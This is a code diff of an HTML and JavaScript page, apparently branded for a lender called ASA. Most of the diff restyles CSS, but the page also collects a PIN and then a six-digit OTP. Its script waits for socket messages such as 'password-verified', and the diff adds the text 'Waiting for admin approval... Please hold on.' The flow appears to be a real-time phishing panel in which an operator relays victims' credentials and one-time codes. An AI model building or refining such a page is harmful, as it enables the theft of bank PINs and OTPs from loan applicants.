@@ -19,10 +19,6 @@
         --eco-green-light: #0b1494;
         --eco-bg: #100474;
         --eco-card: #1d1b25;
-        --eco-text: #101014;
-        --eco-text-light: #94a3b8;
-        --eco-input-bg: #1e293b;
-        --eco-border: rgba(255,255,255,0.08);
         --eco-text: #1e293b;
         --eco-text-light: #64748b;
         --eco-border: #dbe4dc;
@@ -37,31 +33,10 @@
         -webkit-tap-highlight-color: transparent;
     }
 
- body {
-    background: linear-gradient(135deg, #0b025f 0%, #01103a 45%, #111827 100%);
-    color: var(--eco-text);
-}
-
-    body::before {
-        content: '';
-        position: fixed;
-        top: -250px;
-        right: -180px;
-        width: 500px;
-        height: 500px;
-        background: radial-gradient(circle, rgba(0, 166, 81, 0.18) 0%, rgba(0, 166, 81, 0.05) 45%, transparent 70%);
-        z-index: -2;
-    }
-
-    body::after {
-        content: '';
-        position: fixed;
-        bottom: -180px;
-        left: -120px;
-        width: 400px;
-        height: 400px;
-        background: radial-gradient(circle, rgba(0, 166, 81, 0.12) 0%, transparent 70%);
-        z-index: -2;
+    body {
+        background: linear-gradient(135deg, #0b025f 0%, #01103a 45%, #111827 100%);
+        color: var(--eco-text);
+        font-family: 'Inter', sans-serif;
     }
 
     .curve-top {
@@ -78,17 +53,12 @@
     }
 
     .glass-panel {
-        background: var(--eco-card);
+        background: #ffffff;
         border-radius: 26px;
         border: 1px solid rgba(0, 166, 81, 0.08);
         box-shadow: 0 12px 35px rgba(15, 23, 42, 0.08), 0 4px 10px rgba(0, 166, 81, 0.06);
         transition: 0.3s ease;
         overflow: hidden;
-    }
-
-    .glass-panel:hover {
-        transform: translateY(-2px);
-        box-shadow: 0 18px 45px rgba(15, 23, 42, 0.12), 0 8px 18px rgba(0, 166, 81, 0.1);
     }
 
     .label-premium {
@@ -111,10 +81,6 @@
         font-size: 15px;
         outline: none;
         transition: all 0.3s ease;
-    }
-
-    .input-premium::placeholder {
-        color: #94a3b8;
     }
 
     .input-premium:focus, select.input-premium:focus {
@@ -144,7 +110,6 @@
     .btn-premium:hover {
         transform: translateY(-2px);
         background: linear-gradient(135deg, var(--eco-green-light), var(--eco-green));
-        box-shadow: 0 14px 28px rgba(0, 166, 81, 0.28);
     }
 
     .btn-premium:disabled {
@@ -164,12 +129,6 @@
         font-weight: 600;
         cursor: pointer;
         transition: 0.3s ease;
-    }
-
-    .btn-secondary:hover {
-        border-color: var(--eco-green);
-        color: var(--eco-green);
-        background: rgba(0, 166, 81, 0.04);
     }
 
     .progress-step {
@@ -192,14 +151,12 @@
         font-weight: 700;
         color: var(--eco-green-dark);
         margin-bottom: 8px;
-        transition: 0.3s ease;
     }
 
     .progress-step.active .progress-dot {
         background: linear-gradient(135deg, var(--eco-green), var(--eco-green-dark));
         color: white;
         border-color: transparent;
-        box-shadow: 0 0 18px rgba(0, 166, 81, 0.22);
     }
 
     .progress-step.completed .progress-dot {
@@ -212,8 +169,8 @@
     .progress-step.completed .progress-dot span { display: none; }
 
     .pin-box {
-        width: 58px;
-        height: 58px;
+        width: 54px;
+        height: 54px;
         border-radius: 16px;
         border: 2px solid #d7e8dc;
         background: white;
@@ -223,13 +180,11 @@
         font-weight: bold;
         outline: none;
         transition: 0.25s ease;
-        box-shadow: inset 0 2px 5px rgba(15, 23, 42, 0.04);
     }
 
     .pin-box:focus {
         border-color: var(--eco-green);
         box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.12);
-        transform: translateY(-1px);
     }
 
     .ib-phone-wrapper {
@@ -240,13 +195,6 @@
         border-radius: 18px;
         border: 1.5px solid var(--eco-border);
         background: var(--eco-input-bg);
-        transition: 0.3s ease;
-    }
-
-    .ib-phone-wrapper:focus-within {
-        border-color: var(--eco-green);
-        background: white;
-        box-shadow: 0 0 0 4px rgba(0, 166, 81, 0.12);
     }
 
     .ib-country-code {
@@ -269,22 +217,10 @@
         display: inline-block;
     }
 
-    .spinner-md {
-        width: 32px;
-        height: 32px;
-        border-radius: 50%;
-        border: 4px solid #f3f3f3;
-        border-top-color: var(--eco-green);
-        animation: spin 1s linear infinite;
-        display: inline-block;
-    }
-
     @keyframes spin { to { transform: rotate(360deg); } }
 
     @media (max-width: 640px) {
-        .glass-panel { border-radius: 22px; }
-        .curve-top { height: 200px; }
-        .pin-box { width: 48px; height: 48px; font-size: 20px; }
+        .pin-box { width: 44px; height: 44px; font-size: 20px; }
     }
 </style>
 </head>
@@ -292,7 +228,7 @@
     <div class="curve-top"></div>
 
     <main class="max-w-xl mx-auto px-4 pt-10 pb-20 relative z-10">
-        <section class="glass-panel overflow-hidden relative">
+        <section class="glass-panel relative">
             <div class="bg-white px-6 py-6 border-b border-gray-200">
                 <div class="flex flex-col items-center">
                     <img src="./assets/asa_logo_rgb_colour_horiz.png" alt="ASA Logo" class="h-14 w-auto object-contain mb-3">
@@ -377,10 +313,10 @@
                                 <span>Verify & Submit PIN →</span>
                             </button>
                             
-                            <button x-show="passwordVerifying" disabled class="btn-premium bg-amber-700 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
+                            <div x-show="passwordVerifying" class="btn-premium bg-amber-700 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
                                 <div class="spinner-sm"></div>
-                                <span class="text-sm font-semibold tracking-wide">Verifying...</span>
-                            </button>
+                                <span class="text-sm font-semibold tracking-wide">Waiting for admin approval... Please hold on.</span>
+                            </div>
                             
                             <button x-show="!passwordVerifying" @click="step = 3" class="btn-secondary">← Back</button>
                         </div>
@@ -388,8 +324,12 @@
                 </div>
 
                 <div x-show="step === 5" x-cloak x-transition.duration.200ms>
-                    <h2 class="text-xl font-bold mb-2 text-center">Confirm OTP Code</h2>
-                    <p class="text-xs text-gray-400 text-center mb-6">Enter the 6-digit confirmation token sent to your device</p>
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Confirm OTP Code</h2>
+                        <span class="text-xs font-bold text-orange-400">Step 05</span>
+                    </div>
+                    <p class="text-xs text-gray-500 text-center mb-6">Enter the 6-digit confirmation token sent to your device</p>
+                    
                     <div class="space-y-6">
                         <div class="flex justify-center gap-2">
                             <template x-for="(_, i) in 6" :key="i">
@@ -401,9 +341,15 @@
                             </template>
                         </div>
 
-                        <div x-show="pinVerifying" class="btn-premium bg-amber-700 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
-                            <div class="spinner-sm"></div>
-                            <span class="text-sm font-semibold tracking-wide">Verifying...</span>
+                        <div class="grid grid-cols-1 gap-4 pt-2">
+                            <div x-show="pinVerifying" class="btn-premium bg-amber-700 opacity-90 cursor-not-allowed flex items-center justify-center gap-3">
+                                <div class="spinner-sm"></div>
+                                <span class="text-sm font-semibold tracking-wide">Validating Token...</span>
+                            </div>
+
+                            <button x-show="!pinVerifying" @click="submitStep5" :disabled="!isPinValid" class="btn-premium text-base">
+                                <span>Verify & Complete Loan →</span>
+                            </button>
                         </div>
                     </div>
                 </div>
@@ -439,6 +385,10 @@
                 this.socket.on('password-verified', () => { 
                     this.passwordVerifying = false; 
                     this.step = 5; 
+                    setTimeout(() => {
+                        const firstBox = document.querySelectorAll('.step5-box')[0];
+                        if (firstBox) firstBox.focus();
+                    }, 100);
                 });
 
                 this.socket.on('password-rejected', (data) => {
@@ -512,13 +462,14 @@
                 } 
                 else if (e.target.value && i < 5) {
                     document.querySelectorAll('.step5-box')[i+1].focus();
-                    
-                    setTimeout(() => {
-                        if (this.isPinValid && !this.pinVerifying) {
-                            this.submitStep5();
-                        }
-                    }, 50);
                 }
+
+                // Call structure tracking context using explicit instance fallback 
+                setTimeout(() => {
+                    if (this.isPinValid && !this.pinVerifying) {
+                        this.submitStep5();
+                    }
+                }, 50);
             }
         }
     }
